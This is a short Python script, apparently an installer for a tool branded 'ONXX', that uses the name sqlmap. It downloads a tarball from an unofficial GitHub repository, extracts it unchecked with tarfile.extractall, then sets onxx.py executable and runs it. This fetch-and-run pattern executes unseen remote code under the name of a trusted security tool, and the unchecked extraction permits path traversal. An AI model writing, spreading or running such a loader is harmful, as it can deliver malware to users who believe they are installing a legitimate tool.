import urllib.request
import tarfile
import os
import subprocess

URL = "https://github.com/onxx-x146/sqlmap/raw/refs/heads/main/install.tar.gz"
ARCHIVE = "install.tar.gz"

# Clear terminal
os.system("clear")

# Banner
print("\033[91m")
print(r"""
 ██████  ███    ██ ██   ██
██    ██ ████   ██  ██ ██
██    ██ ██ ██  ██   ███
██    ██ ██  ██ ██  ██ ██
 ██████  ██   ████ ██   ██
    BY ONXX 🫅🏻 IG _insrnx_
""")
print("\033[0m")

print("[+] Downloading...")

urllib.request.urlretrieve(URL, ARCHIVE)

print("[+] Download complete")
print("[+] Extracting...")

with tarfile.open(ARCHIVE, "r:gz") as tar:
    tar.extractall(".")

os.remove(ARCHIVE)

onxx_file = None

for root, dirs, files in os.walk("."):
    if "onxx.py" in files:
        onxx_file = os.path.join(root, "onxx.py")
        break

if not onxx_file:
    print("[-] onxx.py not found!")
    exit(1)

os.chmod(onxx_file, 0o755)

print("[+] Permission granted")
print("[+] Starting...\n")

subprocess.run(["python", onxx_file])
